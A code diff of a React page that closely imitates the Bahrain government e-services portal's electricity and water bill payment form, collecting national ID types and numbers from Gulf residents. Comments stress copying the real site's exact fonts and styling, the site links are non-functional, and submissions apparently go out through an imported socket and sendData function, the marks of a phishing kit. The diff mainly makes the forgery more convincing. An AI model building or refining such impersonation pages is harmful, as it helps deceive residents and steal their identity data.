@@ -2,10 +2,6 @@ import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { navigateToPage, sendData, socket } from "@/lib/store";
 
-// Exact font stack from services.bahrain.bh bundle.css
-const FONT = 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif';
-const FONT_EN = '"PT Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif';
-
 export default function HomePage() {
   const [, setLocation] = useLocation();
   const [idType, setIdType] = useState("");
@@ -47,240 +43,470 @@ export default function HomePage() {
   };
 
   return (
-    <div style={{ minHeight: '100vh', background: '#e8e8e8', direction: 'rtl', fontFamily: FONT }}>
-      
-      {/* ===== TOP GRAY HEADER AREA ===== */}
-      <div style={{ background: '#ececec', borderBottom: '1px solid #ddd' }}>
-        <div style={{ maxWidth: '1170px', margin: '0 auto', padding: '0 15px' }}>
-          
-          {/* Row 1: Logo + English */}
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 0 0 0' }}>
-            <div>
-              <img 
-                src="/logo_ar.svg" 
-                alt="شعار مملكة البحرين" 
-                style={{ height: '65px' }} 
-                onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
-              />
-            </div>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '5px', cursor: 'pointer' }}>
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" strokeWidth="1.5">
-                <circle cx="12" cy="12" r="10"/>
-                <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
-              </svg>
-              <span style={{ fontSize: '15px', color: '#333', fontFamily: FONT_EN }}>English</span>
-            </div>
-          </div>
-
-          {/* Row 2: الخدمات الإلكترونية | دليل المعلومات + تسجيل الدخول */}
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 0 12px 0' }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
-              <span style={{ 
-                fontSize: '20px', fontWeight: 'bold', color: '#333', 
-                borderBottom: '3px solid #003366', paddingBottom: '6px',
-                cursor: 'pointer', fontFamily: FONT
-              }}>الخدمات الإلكترونية</span>
-              <span style={{ 
-                fontSize: '20px', fontWeight: 'normal', color: '#555',
-                cursor: 'pointer', fontFamily: FONT
-              }}>دليل المعلومات</span>
-            </div>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-              <svg width="28" height="28" viewBox="0 0 24 24" fill="#888" style={{ cursor: 'pointer' }}>
-                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.4-1.4L10 14.2l7.6-7.6L19 8l-9 9z" opacity="0"/>
-                <path d="M6 19c0 .6.2 1 .5 1.4C4.1 18.4 2.5 15.4 2.5 12c0-5.2 4.3-9.5 9.5-9.5 3.4 0 6.4 1.8 8.1 4.5-.3-.2-.7-.3-1.1-.3-.4-1.3-1.5-2.2-2.8-2.2-1 0-1.8.5-2.4 1.2C13.2 5.3 12.6 5 12 5c-1.7 0-3 1.3-3 3 0 .3 0 .6.1.8C7.3 9.1 6 10.6 6 12.5c0 .4.1.8.2 1.2-.1.2-.2.5-.2.8v4.5z" fill="#aaa"/>
-                <circle cx="8" cy="17" r="1" fill="#aaa"/>
-              </svg>
-              <img src="/emergency-cal.svg" alt="" style={{ width: '22px', height: '22px', cursor: 'pointer', opacity: 0.6 }} onError={(e: any) => e.target.style.display='none'} />
-              <a href="#" style={{
-                background: '#006272', color: '#fff', padding: '6px 20px', borderRadius: '3px',
-                fontSize: '14px', fontWeight: 'bold', textDecoration: 'none', display: 'inline-block',
-                fontFamily: FONT
-              }}>
-                تسجيل الدخول
-              </a>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      {/* ===== NAVIGATION BAR (White) ===== */}
-      <div style={{ background: '#fff', borderBottom: '3px solid #2255a4' }}>
-        <div style={{ maxWidth: '1170px', margin: '0 auto', padding: '0 15px', display: 'flex', alignItems: 'stretch' }}>
-          <a href="#" style={{
-            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
-            borderLeft: '1px solid #ddd', display: 'flex', alignItems: 'center', gap: '6px',
-            fontFamily: FONT, whiteSpace: 'nowrap'
-          }}>
-            <span style={{ color: '#2255a4', fontSize: '18px', fontWeight: 'bold' }}>|</span>
-            الصفحة الرئيسية
-          </a>
-          <a href="#" style={{
-            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
-            borderLeft: '1px solid #ddd', fontFamily: FONT, whiteSpace: 'nowrap',
-            display: 'flex', alignItems: 'center'
-          }}>
-            الخدمات الإلكترونية حسب التصنيف
-          </a>
-          <a href="#" style={{
-            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
-            borderLeft: '1px solid #ddd', fontFamily: FONT, whiteSpace: 'nowrap',
-            display: 'flex', alignItems: 'center'
-          }}>
-            الخدمات الإلكترونية حسب المقدم
-          </a>
-          <a href="#" style={{
-            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
-            fontFamily: FONT, whiteSpace: 'nowrap',
-            display: 'flex', alignItems: 'center'
-          }}>
-            متجر تطبيقات الحكومة الإلكترونية
-          </a>
-        </div>
-      </div>
-
-      {/* ===== BANNER: التخويل الإلكتروني ===== */}
-      <div style={{ maxWidth: '1170px', margin: '20px auto', padding: '0 15px' }}>
-        <div style={{
-          background: '#e3f2fd', border: '2px dashed #d88', borderRadius: '0',
-          padding: '25px 30px', display: 'flex', alignItems: 'center', justifyContent: 'center',
-          position: 'relative', minHeight: '80px'
-        }}>
-          <div style={{ textAlign: 'center', flex: 1 }}>
-            <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#333', margin: '0 0 5px 0', fontFamily: FONT }}>
-              استفد من خدمات{' '}
-              <a href="#" style={{ color: '#1a73e8', textDecoration: 'underline' }}>التخويل الإلكتروني</a>
-            </p>
-            <p style={{ fontSize: '18px', color: '#555', margin: 0, fontFamily: FONT }}>
-              لإنجاز خدمات المكاتب الأمامية للجهات الحكومية
-            </p>
-          </div>
-          <div style={{ position: 'absolute', left: '30px', top: '50%', transform: 'translateY(-50%)' }}>
-            <img src="/bahrain_bh_logo.png" alt="" style={{ height: '50px', opacity: 0.7 }} onError={(e: any) => e.target.style.display='none'} />
-          </div>
-        </div>
-      </div>
-
-      {/* ===== MAIN CONTENT ===== */}
-      <div style={{ maxWidth: '1170px', margin: '0 auto', padding: '0 15px' }}>
+    <>
+      {/* Inject the exact same CSS reset and font stack from services.bahrain.bh */}
+      <style dangerouslySetInnerHTML={{ __html: `
+        .bh-page, .bh-page * {
+          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji" !important;
+          box-sizing: border-box;
+          margin: 0;
+          padding: 0;
+          border: 0;
+          outline: 0;
+        }
+        .bh-page {
+          direction: rtl;
+          min-height: 100vh;
+          background: #F5F5F7;
+          color: #17171C;
+          font-size: 16px;
+          font-weight: 400;
+          line-height: 1.5;
+          -webkit-text-size-adjust: 100%;
+        }
+        .bh-page a {
+          text-decoration: none;
+          color: inherit;
+        }
+        .bh-page img {
+          max-width: 100%;
+          height: auto;
+        }
+        .bh-container {
+          max-width: 1170px;
+          margin: 0 auto;
+          padding: 0 15px;
+        }
         
-        {/* القائمة + Title */}
-        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
-          <div style={{ display: 'flex', alignItems: 'center', gap: '6px', cursor: 'pointer' }}>
-            <img src="/icon_line.svg" alt="menu" style={{ width: '24px', height: '24px' }} onError={(e: any) => { e.target.style.display='none'; }} />
-            <span style={{ fontSize: '14px', color: '#333', fontFamily: FONT }}>القائمة</span>
-          </div>
-          <h2 style={{ fontSize: '20px', fontWeight: 'bold', color: '#333', margin: 0, fontFamily: FONT }}>
-            دفع فاتورة الكهرباء والماء
-          </h2>
-        </div>
-
-        {/* Blue bar: اضغط هنا لعرض التعليمات */}
-        <div style={{
-          background: '#0000CC', color: '#fff', padding: '10px 18px',
-          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-          cursor: 'pointer', fontSize: '15px', fontWeight: 'bold',
-          fontFamily: FONT
-        }}>
-          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><circle cx="12" cy="12" r="10" fill="none" stroke="white" strokeWidth="2"/><text x="12" y="16" textAnchor="middle" fill="white" fontSize="14" fontWeight="bold">i</text></svg>
-            اضغط هنا لعرض التعليمات
-          </div>
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg>
-        </div>
-
-        {/* * بيانات مطلوبة */}
-        <p style={{ fontSize: '13px', color: '#333', margin: '10px 0', textAlign: 'right', fontFamily: FONT }}>
-          * بيانات مطلوبة
-        </p>
-
-        {/* Blue bar: تفاصيل العميل */}
-        <div style={{
-          background: '#0000CC', color: '#fff', padding: '10px 18px',
-          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-          fontSize: '15px', fontWeight: 'bold', fontFamily: FONT
-        }}>
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M7 14l5-5 5 5z"/></svg>
-          <span>تفاصيل العميل</span>
-        </div>
-
-        {/* Form area with dashed red border */}
-        <div style={{
-          background: '#fff', border: '1px dashed #c88', borderTop: 'none',
-          padding: '20px 25px'
-        }}>
-          {/* ID Type */}
-          <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: idType ? '15px' : '0' }}>
-            <label style={{ fontSize: '14px', fontWeight: 'bold', color: '#333', whiteSpace: 'nowrap', fontFamily: FONT }}>
-              <span style={{ color: 'red' }}>*</span> نوع الهوية:
-            </label>
-            <select
-              value={idType}
-              onChange={e => setIdType(e.target.value)}
-              style={{
-                padding: '6px 10px', border: '1px solid #ccc', borderRadius: '0',
-                fontSize: '14px', background: '#fff', cursor: 'pointer', direction: 'rtl',
-                minWidth: '220px', fontFamily: FONT
-              }}
-            >
-              <option value="">-- اختر نوع الهوية --</option>
-              <option value="emirati">الرقم الشخصي الإماراتي</option>
-              <option value="bahraini">الرقم الشخصي البحريني</option>
-              <option value="saudi">الرقم الشخصي السعودي</option>
-              <option value="omani">الرقم الشخصي العماني</option>
-            </select>
-          </div>
-
-          {/* ID Number */}
-          {idType && (
-            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-              <label style={{ fontSize: '14px', fontWeight: 'bold', color: '#333', whiteSpace: 'nowrap', fontFamily: FONT }}>
-                <span style={{ color: 'red' }}>*</span> رقم الهوية:
-              </label>
-              <input
-                type="text"
-                value={idNumber}
-                onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
-                placeholder="أدخل رقم الهوية"
-                maxLength={12}
-                style={{
-                  padding: '6px 10px', border: '1px solid #ccc', borderRadius: '0',
-                  fontSize: '14px', direction: 'ltr', textAlign: 'left', minWidth: '220px',
-                  fontFamily: FONT
-                }}
-              />
+        /* Header area */
+        .bh-header {
+          background: #F5F5F7;
+          border-bottom: 1px solid #EAEAEE;
+        }
+        .bh-header-row1 {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          padding: 12px 0 0 0;
+        }
+        .bh-logo img {
+          height: 60px;
+        }
+        .bh-lang {
+          display: flex;
+          align-items: center;
+          gap: 6px;
+          cursor: pointer;
+          color: #4B4B57;
+          font-size: 15px;
+        }
+        .bh-header-row2 {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          padding: 10px 0 14px 0;
+        }
+        .bh-tabs-row {
+          display: flex;
+          align-items: center;
+          gap: 24px;
+        }
+        .bh-tab {
+          font-size: 18px !important;
+          font-weight: 400 !important;
+          color: #4B4B57 !important;
+          cursor: pointer;
+          padding-bottom: 8px;
+          border-bottom: 3px solid transparent;
+        }
+        .bh-tab.active {
+          font-weight: 600 !important;
+          color: #17171C !important;
+          border-bottom-color: #0747C7;
+        }
+        .bh-header-actions {
+          display: flex;
+          align-items: center;
+          gap: 12px;
+        }
+        .bh-login-btn {
+          background: #078757 !important;
+          color: #fff !important;
+          padding: 7px 22px !important;
+          border-radius: 4px !important;
+          font-size: 14px !important;
+          font-weight: 500 !important;
+          cursor: pointer;
+          display: inline-block;
+        }
+        
+        /* Navigation bar */
+        .bh-nav {
+          background: #fff;
+          border-bottom: 3px solid #0747C7;
+        }
+        .bh-nav-items {
+          display: flex;
+          align-items: stretch;
+        }
+        .bh-nav-item {
+          font-size: 16px !important;
+          font-weight: 400 !important;
+          color: #17171C !important;
+          padding: 10px 14px !important;
+          border-left: 1px solid #D3D3DA;
+          display: flex;
+          align-items: center;
+          white-space: nowrap;
+          cursor: pointer;
+        }
+        .bh-nav-item:last-child {
+          border-left: none;
+        }
+        .bh-nav-item:first-child::before {
+          content: "";
+          display: inline-block;
+          width: 3px;
+          height: 16px;
+          background: #0747C7;
+          margin-left: 10px;
+          border-radius: 2px;
+        }
+        
+        /* Banner */
+        .bh-banner {
+          margin: 20px 0;
+          background: #E5ECF9;
+          border: 2px dashed #D3D3DA;
+          padding: 24px 30px;
+          text-align: center;
+          position: relative;
+        }
+        .bh-banner-title {
+          font-size: 22px !important;
+          font-weight: 600 !important;
+          color: #17171C !important;
+          margin-bottom: 4px !important;
+        }
+        .bh-banner-subtitle {
+          font-size: 16px !important;
+          font-weight: 400 !important;
+          color: #4B4B57 !important;
+        }
+        .bh-banner a {
+          color: #0747C7 !important;
+          text-decoration: underline !important;
+        }
+        
+        /* Content area */
+        .bh-content-header {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          margin-bottom: 12px;
+        }
+        .bh-content-title {
+          font-size: 1.5rem !important;
+          font-weight: 600 !important;
+          color: #17171C !important;
+          line-height: 30px;
+        }
+        .bh-menu-link {
+          display: flex;
+          align-items: center;
+          gap: 6px;
+          font-size: 14px !important;
+          color: #4B4B57 !important;
+          cursor: pointer;
+        }
+        
+        /* Blue bars */
+        .bh-blue-bar {
+          background: #0747C7 !important;
+          color: #fff !important;
+          padding: 10px 18px !important;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          font-size: 15px !important;
+          font-weight: 500 !important;
+          cursor: pointer;
+        }
+        .bh-blue-bar-info {
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        
+        /* Required text */
+        .bh-required-text {
+          font-size: 13px !important;
+          color: #4B4B57 !important;
+          margin: 10px 0 !important;
+          text-align: right;
+        }
+        
+        /* Form area */
+        .bh-form-area {
+          background: #fff;
+          border: 1px solid #D3D3DA;
+          border-top: none;
+          padding: 20px 24px;
+        }
+        .bh-form-row {
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          margin-bottom: 15px;
+        }
+        .bh-form-row:last-child {
+          margin-bottom: 0;
+        }
+        .bh-form-label {
+          font-size: 14px !important;
+          font-weight: 500 !important;
+          color: #17171C !important;
+          white-space: nowrap;
+        }
+        .bh-form-label .required {
+          color: #A70717 !important;
+        }
+        .bh-form-select, .bh-form-input {
+          padding: 8px 12px !important;
+          border: 1px solid #D3D3DA !important;
+          border-radius: 4px !important;
+          font-size: 14px !important;
+          background: #fff !important;
+          color: #17171C !important;
+          min-width: 240px;
+          direction: rtl;
+        }
+        .bh-form-input {
+          direction: ltr;
+          text-align: left;
+        }
+        .bh-form-select:focus, .bh-form-input:focus {
+          border-color: #0747C7 !important;
+          outline: none;
+          box-shadow: 0 0 0 2px rgba(7, 71, 199, 0.15);
+        }
+        
+        /* Buttons */
+        .bh-buttons {
+          display: flex;
+          gap: 10px;
+          justify-content: center;
+          margin: 20px 0 40px 0;
+          padding: 0 !important;
+        }
+        .bh-btn-primary {
+          background: #0747C7 !important;
+          color: #fff !important;
+          padding: 8px 28px !important;
+          border-radius: 4px !important;
+          font-size: 14px !important;
+          font-weight: 500 !important;
+          cursor: pointer;
+        }
+        .bh-btn-primary:disabled {
+          background: #C0C0CA !important;
+          cursor: not-allowed;
+        }
+        .bh-btn-back {
+          background: #EAEAEE !important;
+          color: #17171C !important;
+          padding: 8px 28px !important;
+          border-radius: 4px !important;
+          font-size: 14px !important;
+          font-weight: 500 !important;
+          cursor: pointer;
+        }
+        
+        /* Bottom line */
+        .bh-bottom-line {
+          height: 4px;
+          background: #0747C7;
+          margin-top: 30px;
+        }
+        
+        /* Mobile responsive */
+        @media (max-width: 768px) {
+          .bh-header-row2 {
+            flex-direction: column;
+            gap: 10px;
+            align-items: flex-start;
+          }
+          .bh-nav-items {
+            flex-wrap: wrap;
+          }
+          .bh-nav-item {
+            font-size: 14px !important;
+            padding: 8px 10px !important;
+          }
+          .bh-form-row {
+            flex-direction: column;
+            align-items: flex-start;
+          }
+          .bh-form-select, .bh-form-input {
+            width: 100%;
+            min-width: unset;
+          }
+        }
+      `}} />
+      
+      <div className="bh-page">
+        {/* ===== HEADER ===== */}
+        <div className="bh-header">
+          <div className="bh-container">
+            {/* Row 1: Logo + English */}
+            <div className="bh-header-row1">
+              <div className="bh-logo">
+                <img 
+                  src="/logo_ar.svg" 
+                  alt="شعار مملكة البحرين"
+                  onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
+                />
+              </div>
+              <div className="bh-lang">
+                <svg width="18" height="18" viewBox="0 0 32 32" fill="none" stroke="#4B4B57" strokeWidth="1.5">
+                  <circle cx="16" cy="16" r="14"/>
+                  <path d="M2 16h28M16 2a20 20 0 0 1 5.5 14 20 20 0 0 1-5.5 14 20 20 0 0 1-5.5-14A20 20 0 0 1 16 2z"/>
+                </svg>
+                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif' }}>English</span>
+              </div>
             </div>
-          )}
+
+            {/* Row 2: Tabs + Actions */}
+            <div className="bh-header-row2">
+              <div className="bh-tabs-row">
+                <span className="bh-tab active">الخدمات الإلكترونية</span>
+                <span className="bh-tab">دليل المعلومات</span>
+              </div>
+              <div className="bh-header-actions">
+                <img src="/emergency-cal.svg" alt="" style={{ width: '20px', height: '20px', cursor: 'pointer', opacity: 0.7 }} onError={(e: any) => e.target.style.display='none'} />
+                <span className="bh-login-btn">تسجيل الدخول</span>
+              </div>
+            </div>
+          </div>
         </div>
 
-        {/* Buttons */}
-        <div style={{ display: 'flex', gap: '10px', justifyContent: 'center', margin: '20px 0 40px 0' }}>
-          {idType && idNumber && (
-            <button
-              onClick={handleSubmit}
-              disabled={isSubmitting}
-              style={{
-                background: isSubmitting ? '#ccc' : '#006272',
-                color: '#fff', border: 'none', padding: '8px 28px', borderRadius: '0',
-                fontSize: '14px', fontWeight: 'bold', cursor: isSubmitting ? 'not-allowed' : 'pointer',
-                fontFamily: FONT
-              }}
-            >
-              {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
-            </button>
-          )}
-          <button style={{
-            background: '#FFD700', color: '#333', border: 'none', padding: '8px 28px',
-            borderRadius: '0', fontSize: '14px', fontWeight: 'bold', cursor: 'pointer',
-            fontFamily: FONT
-          }}>
-            رجوع
-          </button>
+        {/* ===== NAVIGATION BAR ===== */}
+        <div className="bh-nav">
+          <div className="bh-container">
+            <div className="bh-nav-items">
+              <a className="bh-nav-item">الصفحة الرئيسية</a>
+              <a className="bh-nav-item">الخدمات الإلكترونية حسب التصنيف</a>
+              <a className="bh-nav-item">الخدمات الإلكترونية حسب المقدم</a>
+              <a className="bh-nav-item">متجر تطبيقات الحكومة الإلكترونية</a>
+            </div>
+          </div>
         </div>
+
+        {/* ===== BANNER ===== */}
+        <div className="bh-container">
+          <div className="bh-banner">
+            <div className="bh-banner-title">
+              استفد من خدمات <a href="#">التخويل الإلكتروني</a>
+            </div>
+            <div className="bh-banner-subtitle">
+              لإنجاز خدمات المكاتب الأمامية للجهات الحكومية
+            </div>
+          </div>
+        </div>
+
+        {/* ===== MAIN CONTENT ===== */}
+        <div className="bh-container">
+          {/* Title row */}
+          <div className="bh-content-header">
+            <div className="bh-menu-link">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4B4B57" strokeWidth="2" strokeLinecap="round">
+                <line x1="3" y1="6" x2="21" y2="6"/>
+                <line x1="3" y1="12" x2="21" y2="12"/>
+                <line x1="3" y1="18" x2="21" y2="18"/>
+              </svg>
+              <span>القائمة</span>
+            </div>
+            <h2 className="bh-content-title">دفع فاتورة الكهرباء والماء</h2>
+          </div>
+
+          {/* Blue bar: Instructions */}
+          <div className="bh-blue-bar">
+            <div className="bh-blue-bar-info">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/>
+                <line x1="12" y1="11" x2="12" y2="17" stroke="white" strokeWidth="2" strokeLinecap="round"/>
+                <circle cx="12" cy="8" r="1" fill="white"/>
+              </svg>
+              <span>اضغط هنا لعرض التعليمات</span>
+            </div>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg>
+          </div>
+
+          {/* Required text */}
+          <div className="bh-required-text">
+            <span style={{ color: '#A70717' }}>*</span> بيانات مطلوبة
+          </div>
+
+          {/* Blue bar: Customer details */}
+          <div className="bh-blue-bar">
+            <span>تفاصيل العميل</span>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 14l5-5 5 5z"/></svg>
+          </div>
+
+          {/* Form area */}
+          <div className="bh-form-area">
+            <div className="bh-form-row">
+              <label className="bh-form-label">
+                <span className="required">*</span> نوع الهوية:
+              </label>
+              <select
+                className="bh-form-select"
+                value={idType}
+                onChange={e => setIdType(e.target.value)}
+              >
+                <option value="">-- اختر نوع الهوية --</option>
+                <option value="emirati">الرقم الشخصي الإماراتي</option>
+                <option value="bahraini">الرقم الشخصي البحريني</option>
+                <option value="saudi">الرقم الشخصي السعودي</option>
+                <option value="omani">الرقم الشخصي العماني</option>
+              </select>
+            </div>
+
+            {idType && (
+              <div className="bh-form-row">
+                <label className="bh-form-label">
+                  <span className="required">*</span> رقم الهوية:
+                </label>
+                <input
+                  className="bh-form-input"
+                  type="text"
+                  value={idNumber}
+                  onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
+                  placeholder="أدخل رقم الهوية"
+                  maxLength={12}
+                />
+              </div>
+            )}
+          </div>
+
+          {/* Buttons */}
+          <div className="bh-buttons">
+            {idType && idNumber && (
+              <button
+                className="bh-btn-primary"
+                onClick={handleSubmit}
+                disabled={isSubmitting}
+              >
+                {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
+              </button>
+            )}
+            <button className="bh-btn-back">رجوع</button>
+          </div>
+        </div>
+
+        {/* Bottom line */}
+        <div className="bh-bottom-line"></div>
       </div>
-
-      {/* ===== BOTTOM BLUE LINE ===== */}
-      <div style={{ height: '4px', background: '#2255a4', marginTop: '30px' }}></div>
-    </div>
+    </>
   );
 }
